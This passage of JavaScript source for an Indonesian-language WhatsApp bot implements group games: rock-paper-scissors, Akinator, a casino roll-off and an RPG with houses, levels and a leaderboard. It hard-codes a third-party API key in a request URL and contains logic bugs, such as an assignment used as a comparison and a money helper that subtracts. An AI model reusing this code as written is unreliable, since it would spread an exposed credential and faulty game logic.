	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    Manik.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) Manik.sendText(roof.p, `Please select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) Manik.sendText(roof.p2, `Please select \n\nRock🗿\nPaper📄\nScissor✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) Manik.sendText(m.chat, `Both players don't want to play,\nSuit canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    Manik.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose suit, game over`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) Manik.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) Manik.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    Manik.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`
Don't tag him!
He's in Offline/AFK, ${reason ? 'with reason ' + reason : 'no reason'}
Its been ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.users[m.sender].afkTime > -1) {
            let user = global.db.users[m.sender]
            reply(`
You came back online from AFK${user.afkReason ? ' after ' + user.afkReason : ''}
In ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
const addUang = (sender, amount) => {
      let position = false
      Object.keys(_money).forEach((i) => {
        if (_money[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        _money[position].money += amount
        fs.writeFileSync('./database/adventure/uang.json', JSON.stringify(_money))
      }
    }
    const uangAdd = (sender, amount) => {
      let position = false
      Object.keys(_money).forEach((i) => {
        if (_money[i].id == sender) {
          position = i
        }
      })
      if (position !== false) {
        _money[position].money -= amount
        fs.writeFileSync('./database/adventure/uang.json', JSON.stringify(_money))
      }
    }
        const addMonUser = (sender, amount) => {
      let position = false
      Object.keys(money).forEach((i) => {
        if (money[i].id === sender) {
          position = i
        }
      })
      if (position !== false) {
        money[position].money += amount
        fs.writeFileSync('./uang.json', JSON.stringify(money))
      }
    }
    
    const moneyAdd = (sender, amount) => {
      let position = false
      Object.keys(money).forEach((i) => {
        if (money[i].id == sender) {
          position = i
        }
      })
      if (position !== false) {
        money[position].money -= amount
        fs.writeFileSync('./uang.json', JSON.stringify(money))
      }
    }
    const getMonUser = (sender) => {
        let fiendh = false
      for (let potonlmt of money) {
        if (potonlmt.id === sender) {
           global.userPoton = potonlmt.money
          fiendh = true
          return global.userPoton
        }
      }
      //function adven
      if (fiendh === false) {
        let obj = { id: sender, money: 0 }
        money.push(obj)
        fs.writeFileSync('./uang.json', JSON.stringify(money))
      }
      }
        // Auto Write Database Akinator Every 1 Minutes
               setInterval(() => {
                  fs.writeFileSync('./database/akinator.json', JSON.stringify(akinator, null, 2))
               }, 30 * 1000)

               // Akinator
               if (!isGroup && akinator.hasOwnProperty(sender.split('@')[0]) && !isCmd && ["0", "1", "2", "3", "4"].includes(chath)) {
                 var { server, frontaddr, session, signature, question, step } = akinator[sender.split('@')[0]]
                 var jwb = (await akiAnswer(server, frontaddr, session, signature, step, chath)).result
                 if (jwb.hasOwnProperty('name')) {
                   var img = await getBuffer(jwb.image)
                   var cpt = `*HASIL DITEMUKAN*\n\nNama : ${jwb.name}\nDeskripsi : ${jwb.description}`
                   Manik.sendMessage(from, { image: img, caption: cpt }, { quoted: m })
                   .then( res => {
                     delete akinator[sender.split("@")[0]]
                   })
                   return
                 }
                 /* if (chath == "5") {
                   var bhasil = (await akiBack(server, frontaddr, session, signature, step, chath)).result
                   var bques = bhasil.question
                   var bstep = bhasil.step
                   var bteks = `${question}\n\n`
                   bteks += `0 - Ya\n`
                   bteks += `1 - Tidak\n`
                   bteks += `2 - Tidak Tahu\n`
                   bteks += `3 - Mungkin\n`
                   bteks += `4 - Mungkin Tidak`
                   Manik.sendMessage(from, { text: bteks }, { quoted: m }).then( res => {
                     var baki = akinator[sender.split("@")[0]]
                     baki.question = bques
                     baki.step = bstep
                     akinator[sender.split("@")[0]] = baki
                   })
                 } else {*/
                   var jques = jwb.question
                   var jstep = jwb.step
                   var jteks = `${jques}\n\n`
                   jteks += `0 - Ya\n`
                   jteks += `1 - Tidak\n`
                   jteks += `2 - Tidak Tahu\n`
                   jteks += `3 - Mungkin\n`
                   jteks += `4 - Mungkin Tidak`
                   Manik.sendMessage(from, { text: jteks }, { quoted: m }).then( res => {
                     var jaki = akinator[sender.split("@")[0]]
                     jaki.question = jques
                     jaki.step = jstep
                     akinator[sender.split("@")[0]] = jaki
                   })
                 // }
               }
        
        if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
            var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
            if (get_data_respon.isImage === false) {
            Manik.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
            } else {
            buff = await getBuffer(get_data_respon.image_url)
              Manik.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
            }
        }

	    if (fs.existsSync(`./database/${from}.json`)) {
          var casinoo = setCasino(`${from}`)
          if (sender == `${casinoo.Y}@s.whatsapp.net` && chath.toLowerCase() == 'n') {
          Manik.sendMessage(from, { text: `「 Game Casino Rejected 」\n\n• @${casinoo.Y} Membatalkan Game`, mentions: [casinoo.Y+"@s.whatsapp.net"] }, {quoted: m })
          deleteCasino(from)
          }
        if (sender == `${casinoo.Y}@s.whatsapp.net` && chath.toLowerCase() == 'y') {
          var angka1 = await randomNomor(10, 20)
          var angka2 = await randomNomor(10, 20)
          if (angka1 > angka2) {
          starGame =  `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
        Manik.sendMessage(from, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net",  casinoo.Y + "@s.whatsapp.net"]}, {quoted: m })
            await addBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
            await kurangBalance(`${casinoo.Y}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
            deleteCasino(from)
        } else if (angka1 < angka2) {
           starGame =  `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
        Manik.sendMessage(from, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net",  casinoo.Y + "@s.whatsapp.net"] }, {quoted: m })
        await addBalance(`${casinoo.Y}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
        await kurangBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
        deleteCasino(from)
          } else if (angka1 = angka2) {
        starGame =  `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
            Manik.sendMessage(from, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net",  casinoo.Y + "@s.whatsapp.net" ]}, { quoted: m })
            deleteCasino(from)
        }
    }
}
const reSize = async (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var bu = await Jimp.read(buffer);
        var ab = await bu.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
} 
orang = 'Tidak Mampu'
cekrumah = rumahrpg.getOrangId(sender, _rumah)
getrumah = rumahrpg.getOrangReason(cekrumah, _rumah)
if(getrumah === 'Tidak Punya') {
	orang = 'Tidak Mampu'
	}
if(getrumah === 'Rumah Kayu') {
	orang = 'Orang Miskin'
	}
	if(getrumah === 'Rumah Mewah') {
	orang = 'Orang Kaya'
	}
	if(getrumah === 'Kerajaan') {
	orang = 'Seorang Raja'
	}
	if(getrumah === 'Rumah Biasa') {
	orang = 'Orang Biasa'
	}
if(orang === 'Orang Miskin') {
myHouse = 'https://telegra.ph/file/104e2616e7d6fe783cf7b.jpg' 
}
if(orang === 'Orang Biasa') {
myHouse = 'https://telegra.ph/file/d946f00abda9b0cc6ebc2.jpg'
}
if(orang === 'Orang Kaya') {
myHouse = 'https://telegra.ph/file/d0ac09ed624e2e8413c57.jpg'
}
if(orang === 'Seorang Raja') {
myHouse = 'https://telegra.ph/file/56bca19855844c2a1b4dc.jpg'
}
        switch(command) {      
//RPG NEW GENERATION BY MANIK
case prefix+'joinrp':
              if (!isGroup) return reply('Group Only')
              if (args.length == 0) return reply(`Example: ${command} Hikari`)
              if (isBrave) return reply('Kau sudah terdaftar')
              const reason = q ? q : 'Nothing.'
              const rosen = 'Tidak Punya'
              namerpg.addNameUser(sender, time, reason, _name)
              rumahrpg.addOrangUser(sender, time, rosen, _rumah)
              const aluty = `*Anda berhasil Mendaftar Role Player!*\n\n➸ *Username*: ${pushname}\n➸ *Name Player*: ${reason}`
              reply(aluty)
break
case prefix+'myrpname': {
        	if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
            const getId = namerpg.getNameId(sender, _name)
            const getReason = namerpg.getNameReason(getId, _name)
            reply(`➸ *Username*: ${pushname}\n➸ *Name Player*: ${getReason}`) 
        	break
        }
case prefix+'ceklimitrp':
      reply(`Limit Game RP : ${userPotan}/${rplimitawal}\nLimit Anda Akan direset Setiap 6 Jam Sekali`)
      break
case prefix+'heal':
      if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
      if (!isGroup) return reply('Group Only')
        reply(`SISA HEAL: ${userHeal}`)
        break
case prefix+'gumption':
      if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
      if (!isGroup) return reply('Group Only')
        reply(`SISA GUMPTION: ${userPotion}`)
        break
    case prefix+'crystal':
        if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
        if (!isGroup) return reply('Group Only')
        reply(`SISA CRYSTAL: ${userCrystal}`)
      break
case prefix+'healing':{
      	if(userPotan < 1){ return reply(`Limit Kmu Sudah Habis`)}
      if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
      if (!isGroup) return reply('Group Only')
        const healperpotion = 1
        const heladadd = 25
        const pot = healperpotion * 1
        getId = namerpg.getNameId(sender, _name)
        getReason = namerpg.getNameReason(getId, _name)
        if (isPotion(sender)) return reply(`maaf gumption kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
        potionAdd(sender, pot)
        addHealUser(sender, heladadd)
               helin = `
◪ *「 SUKSES HEALING 」*

├─ ❏ *Player* : ${getReason}
├─ ❏ *Gumption terpakai* : 1 
└─ ❏ *Menambah* : 25heal

Note: Hati-Hati Saat Sedang Berpetualang, Banyak Rintangan Untuk Anda`
        reply(helin)
rplimitAdd(sender, rpliminya)
}
        break
        case prefix+'buygumption':{
if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
if (!isGroup) return reply('Group Only')
        if(userPotan < 1){ return reply(`Limit Kmu Sudah Habis`)}
        const crysperpotion = 1000
        const gumpadd = 1
        const aryamanik = crysperpotion * 1
        getId = namerpg.getNameId(sender, _name)
        getReason = namerpg.getNameReason(getId, _name)
        if(userCrystal < 1000){ return reply(`Maaf Crystal Anda Tersisa ${userCrystal}, Silahkan Melakukan Gaincrystal`)}
         crystalAdd(sender, aryamanik)
          addPotioUser(sender, gumpadd)
          const prom1 = `
◪ *「 GUMPTION TELAH TERISI 」*

├─ ❏ *NickWa* : *@${pushname}*
├─ ❏ *Player* : *${getReason}*
├─ ❏ *Get Gumption* : *1*
├─ ❏ *Harga* : *1000 Crystal*
└─ ❏ *Sisa Crystal* : *${userCrystal}*`
reply(prom1)
    rplimitAdd(sender, rpliminya)   
 break
}
case prefix+'myhouse':{
	if(userPotan < 1){ return reply(`Limit Kmu Sudah Habis`)}
	if (!isGroup) return reply('Group Only')
	if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
	if(getrumah === 'Tidak Punya') { return reply('Anda Tidak Memiliki Rumah, Silahkan Kumpulkan Uang Dan Membeli Rumah') }
	getId = namerpg.getNameId(sender, _name)
    getReason = namerpg.getNameReason(getId, _name)
    let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
	housee = await getBuffer(myHouse)
	Manik.sendImage(m.chat, housee, `Hai ${getReason}
Ini Adalah Rumahmu Dan Kmu Adalah ${orang}

╭─ ❏*「 ABOUT YOURS」*
├─ ❏ Xp : *${userXp} / ${requiredXp}*
├─ ❏ Level : *${userLevel}*
├─ ❏ Role: *${role}*
├─ ❏ Gumption: *${userPotion}*
├─ ❏ Heal: *${userHeal}*
├─ ❏ Crystal: *${userCrystal}*
├─ ❏ Money: *${formatmoney(userPoton ? userPoton : "Rp0,00")}*
├─ ❏ Status: *${orang}*
├─ ❏ House: *${getrumah}*
└─ ❏`, m)
rplimitAdd(sender, rpliminya)
break
}
        case prefix+'buyhouse':{
	if (!q) return reply(`Pilih:\nkayu\nbiasa\nmewah\nkerajaan\n\nExample: ${prefix + command} kerajaan`)
	if(userPotan < 1){ return reply(`Limit Kmu Sudah Habis`)}
	if (!isGroup) return reply('Group Only')
	if (!isBrave) return
	if(q === 'kayu') {
		if(orang === 'Orang Biasa'){ return reply('Anda Sudah Membeli Rumah Biasa, Tidak Bisa Merendah') }
		if(orang === 'Orang Kaya'){ return reply('Anda Sudah Membeli Rumah Mewah, Tidak Bisa Merendah') }
			if(orang === 'Seorang Raja'){ return reply('Anda Sudah Memiliki Kerajaan, Tidak Bisa Merendah') }
		if(orang === 'Orang Miskin'){ return reply('Anda Sudah Membeli Rumah Ini') }
	if(userPoton < 25000){ return reply('Uang Anda Tidak Cukup Atau Kurang dari Rp50.000') }
	if(userPoton > 25000){
	arya = 25000
	manik = arya * 1
	const rosen = 'Rumah Kayu'
	uangAdd(sender, manik)  
		_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/adventure/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
	reply('Berhasil Membeli Rumah Biasa')
		}
		}
	if(q === 'biasa') {
		if(orang === 'Orang Kaya'){ return reply('Anda Sudah Membeli Rumah Mewah, Tidak Bisa Merendah') }
			if(orang === 'Seorang Raja'){ return reply('Anda Sudah Memiliki Kerajaan, Tidak Bisa Merendah') }
		if(orang === 'Orang Biasa'){ return reply('Anda Sudah Membeli Rumah Ini') }
	if(userPoton < 50000){ return reply('Uang Anda Tidak Cukup Atau Kurang dari Rp50.000') }
	if(userPoton > 50000){
	arya = 50000
	manik = arya * 1
	const rosen = 'Rumah Biasa'
	uangAdd(sender, manik) 
		_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/adventure/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
	reply('Berhasil Membeli Rumah Biasa')
		}
		}
		if(q === 'mewah') {
			if(orang === 'Seorang Raja'){ return reply('Anda Sudah Memiliki Kerajaan, Tidak Bisa Merendah') }
			if(orang === 'Orang Kaya'){ return reply('Anda Sudah Membeli Rumah Ini') }
	if(userPoton < 100000){ return reply('Uang Anda Tidak Cukup Atau Kurang dari Rp100.000') }
	if(userPoton > 100000){
	arya = 100000
	manik = arya * 1
	const rosen = 'Rumah Mewah'
	uangAdd(sender, manik) 
		_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/adventure/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
	reply('Berhasil Membeli Rumah Mewah')
		}
		}
	if(q === 'kerajaan') {
		if(orang === 'Seorang Raja'){ return reply('Anda Sudah Membeli Rumah Ini') }
	if(userPoton < 150000){ return reply('Uang Anda Tidak Cukup Atau Kurang dari Rp150.000') }
	if(userPoton > 150000){
	arya = 150000
	manik = arya * 1
	const rosen = 'Kerajaan'
	uangAdd(sender, manik) 
		_rumah.splice(rumahrpg.getOrangPosition(sender, _rumah), 1)
fs.writeFileSync('./database/adventure/Orangrpg.json', JSON.stringify(_rumah))
rumahrpg.addOrangUser(sender, time, rosen, _rumah)
	reply('Berhasil Membeli Kerajaan')
		}
		}
		rplimitAdd(sender, rpliminya)
	break
	}
	case prefix+'level': 
              if (!isGroup) return reply('Group Only')
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
              let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
              try {
              profilePic = await Manik.profilePictureUrl(sender, image)
              } catch {
              profilePic = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
              buffer = await getBuffer(`https://api.lolhuman.xyz/api/rank?apikey=SadTeams&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
              teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n➸ *Gumption*: *${userPotion}*\n➸ *Heal*: *${userHeal}*\n➸ *Crystal*: *${userCrystal}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
              Manik.sendImage(m.chat, buffer, teks, m)
              break
	case prefix+'leveling':
              if (!isGroup) return reply('Group Only')
              if (q === 'enable') {
              if (isLevelingOn) return reply('Fitur leveling telah diaktifkan sebelumnya.')
            _leveling.push(from)
              fs.writeFileSync('./database/adventure/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil diaktifkan.')
              } else if (q === 'disable') {
              var anup = _leveling.indexOf(from)
            _leveling.splice(anup, 1)
              fs.writeFileSync('./database/adventure/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil dimatikan.')
              } else {
              reply('Pilih enable atau disable!')
}
              break
case prefix+'leaderboard': //Cek Leaderboard
              if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!') 
              const resp = _level
            _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
              let leaderboard =  '-----[ *LEADERBOARD* ]----\n\n'
              try {
              for (let i = 0; i < 10; i++) {
              var roles = 'Warrior III'
              if (resp[i].level <= 5) {
              roles = 'Warrior II'
              } else if (resp[i].level <= 10) {
              roles = 'Warrior I'
              } else if (resp[i].level <= 15) {
              roles = 'Elite III'
              } else if (resp[i].level <= 20) {
              roles = 'Elite II'
              } else if (resp[i].level <= 25) {
              roles = 'Elite I'
              } else if (resp[i].level <= 30) {
              roles = 'Master III'
              } else if (resp[i].level <= 35) {
              roles = 'Master II'
              } else if (resp[i].level <= 40) {
              roles = 'Master I'
              } else if (resp[i].level <= 45) {
              roles = 'GrandMaster III'
              } else if (resp[i].level <= 50) {
              roles = 'GrandMaster II'
              } else if (resp[i].level <= 55) {
              roles = 'GrandMaster I'
              } else if (resp[i].level <= 60) {
              roles = 'Epic III'
              } else if (resp[i].level <= 65) {
              roles = 'Epic II'
              } else if (resp[i].level <= 70) {
              roles = 'Epic I'
              } else if (resp[i].level <= 75) {
              roles = 'Legend III'
              } else if (resp[i].level <= 80) {
              roles = 'Legend II'
              } else if (resp[i].level <= 85) {
              roles = 'Legend I'
              } else if (resp[i].level <= 90) {
              roles = 'Mythic'
              } else if (resp[i].level <= 95) {
              roles = 'Mythical Glory'
              } else if (resp[i].level >= 100) {
              roles = 'Immortal'
} 

              leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role*: *${roles}*\n➸ *Gumption*: *${userPotion}*\n➸ *Heal*: *${userHeal}*\n➸ *Crystal*: *${userCrystal}*\n\n`
}
              reply(leaderboard)
              } catch (err) {
              console.error(err)
              reply('_Perlu setidaknya 10 user yang memiliki level di database!_')
}
              break
case prefix+'cheatlevel':
if(!isManik) { return reply('AndaBukanOwner') }
cheat = randomNomor(10000)
level.addLevelingXp(sender, cheat, _level)
reply(`Sukses Menambah ${cheat} Xp`)
break
case prefix+'rpbalance': 
               reply(`Limit Game RP : ${userPotan}/${rplimitawal}\nBalance : ${formatmoney(userPoton ? userPoton : "Rp0,00")}`)
               break
case prefix+'adventuremenu': case prefix+'roleplaymenu':{
	if(userPotan < 1){ return reply(`Limit Kmu Sudah Habis`)}
if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
getId = namerpg.getNameId(sender, _name)
getReason = namerpg.getNameReason(getId, _name)
        let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
               rpg = `
Hai *${getReason}* 
Ini Adalah Menu RolePlayer

👑 *「 PLAYER  INFO」*
• NickWa : *${pushname}*
• Xp : *${userXp} / ${requiredXp}*
• Level : *${userLevel}*
• Role: *${role}*
• Gumption: *${userPotion}*
• Heal: *${userHeal}*
• Crystal: *${userCrystal}*
• Money: *Rp.${userPoton}*
• Status: *${orang}*
• Limit RP: *${userPotan}/${rplimitawal}*

📜 *「 ROLEPLAY  MENU」*
• ${prefix}joinrp [Name RP] *Daftar RP*
• ${prefix}myrpname *cek name RP* 
• ${prefix}ceklimitrp *cek limit RP anda* 
• ${prefix}getpremium *Get PremiumUser*  
• ${prefix}heal  *cek heal*
• ${prefix}gumption *cek gumption*  
• ${prefix}crystal *cek crystal*  
• ${prefix}rpbalance *cek balance*
• ${prefix}healing *menambah heal*
• ${prefix}buygumption *buy gumption*
• ${prefix}myhouse *Rumah Anda*
• ${prefix}buyhouse [query] *Rumah Anda*
• ${prefix}level *cek level anda*
• ${prefix}cheatlevel *cheat level anda*
• ${prefix}leaderboard *cek rank*

📟 *「 ROLEPLAY  GAME」*
• ${prefix}adventure *Memulai*
• ${prefix}gaincrystal *Get Crystal*
• ${prefix}mining *Menambah balance*
• ${prefix}luckyslot *Slot Berhadiah*
• ${prefix}mission *Misi Level*
• ${prefix}missionlvl1-10 *Kill Slime*
• ${prefix}missionlvl11-20 *Kill Goblin*
• ${prefix}missionlvl21-30 *Kill Devil*
• ${prefix}missionlvl31-40 *Kill Behemoth*
• ${prefix}missionlvl41-50 *Kill Demon*
• ${prefix}missionlvl51-60 *Kill Demon King*
• ${prefix}missionlvl61-100 *Last Monster*
`
reply(rpg)
        break
        }
        case prefix+'adventure':{
      if(userPotan < 1){ return reply(`Limit Kmu Sudah Habis`)}
      if (!isBrave) return  reply(`Anda Tidak Terdaftar Sebagai Role Player Dalam Database, Ketik ${prefix}joinrp Nama RolePlay Anda`)
      if (!isGroup) return reply('Group Only')
      if(userHeal < 25){ return reply(`Maaf Heal Anda Tersisa ${userHeal}, Silahkan Melakukan Healing`)}
        ngab = ['Longsor', 'Letusan Gunung', 'Tsunami', 'Gempa Bumi', 'Meteor', 'Demon']
        const sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
        getId = namerpg.getNameId(sender, _name)
        getReason = namerpg.getNameReason(getId, _name)
        await setTimeout(() => {
          reply(`${getReason} Sedang Berpetualang Mencari harta karun`)
        }, 2000)
        await setTimeout(() => {
          reply(`Tiba Tiba Ada ${sesuatu}`)
        }, 2500)
        await setTimeout(() => {
          reply(`MENGHINDARR!!!`)
        }, 3000)
        const dungeon = ['Whetstone', 'Willow Field', 'Rodeo', 'Verdant Blufs', 'Bull Holland', 'Fallen Tree', 'Dellnort', 'Verona Lush', 'Leafy Hollow', 'Chilliad Dome', 'Garcia', 'Pine Valley', 'Santa Florals', 'Guvero East', 'Cranbarry', 'Junever', 'Aldea Malvada', 'Green Palms', 'Green Oasis', 'Fort Carson', 'Prickel Pine', 'Pilson Meadow', 'Boca Roca', 'Rocksore East', 'Camel Toe', 'Hanky Panky', 'Fern Ridge', 'Montgomerry', 'Flint Yankton', 'Vespucci', 'fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak', 'Vertical Zone', 'Sentainel Country', 'Night City', 'Flush City', 'Royals Canyon', 'Blackburn', 'Peterborough', 'Tarnstead', 'Jarren’s', 'Outpost', 'Landow', 'Nearon', 'Kincardine', 'Aysgarth', 'Veritas', 'Openshaw', 'Bredwardine', 'Berkton', 'Wolford', 'Norwich', 'Kald', 'Solaris', 'Kilead', 'Pitmerden', 'Acomb', 'Eldham', 'Warcester', 'Lingmell', 'Kilead', 'Cromerth', 'Wingston', 'Garmsby', 'Kingcardine', 'Perthlochry', 'Frostford', 'Hillford', 'Hardersfield', 'Tarrin', 'Holmfirth', 'Caerleon', 'Elisyum', 'Ballaeter', 'Penshaw', 'Bradford', 'Wigston', 'Accreton', 'Kameeraska', 'Ferncombe', 'Kilerth', 'Erostey', 'Carran', 'Jongvale', 'Larnwick', 'Queenstown', 'Whaelrdrake', 'Baerney', 'Wingston', 'Arkney', 'Strongfair', 'Lowestoft', 'Beggar’s Hole', 'Shepshed', 'Perthlochry', 'Ironforge', 'Tywardreath', 'Pontheugh', 'Foolshope', 'Hull', 'Dalmerlington', 'Aucteraden', 'Woodpine', 'Millstone', 'Windermere', 'Lancaster', 'Kirkwall', 'Rotherhithe', 'Astrakhan', 'Watford', 'Ritherhithe', 'Krosstoen', 'Pella’s', 'Wish', 'Grimsby', 'Ayrith', 'Ampleforth', 'Skystead', 'Eanverness', 'Penshaw', 'Peatsland', 'Astrakane', 'Pontybridge', 'Caershire', 'Snowbush', 'Sutton', 'Northwich', 'Hogsfeet', 'Claethorpes', 'Sudbury', 'Cherrytown', 'Blue Field', 'Orrinshire', 'Aempleforth', 'Garrigill', 'Jedburgh', 'Eastbourne', 'Taedmorden', 'Venzor', 'Grasmere', 'Ubbin', 'Falls', 'Violl’s Garden', 'Glanchester', 'Bailymena', 'Arkkukari', 'Skargness', 'Cardend', 'Llanybydder', 'Faversham', 'Yellowseed', 'Carlisle', 'Cirencester', 'Aramoor', 'Furness', 'Kincardine', 'Rotherham', 'Emelle', 'Boroughton', 'Carran', 'Ffestiniog', 'Mansfield', 'Huthwaite', 'Marclesfield', 'Pavv', 'Squall’s End', 'Glenarm', 'Dragontail', 'Moressley', 'Hardersfield', 'Gilramore', 'Aria', 'Ecrin', 'Clare View Point', 'Blackburn', 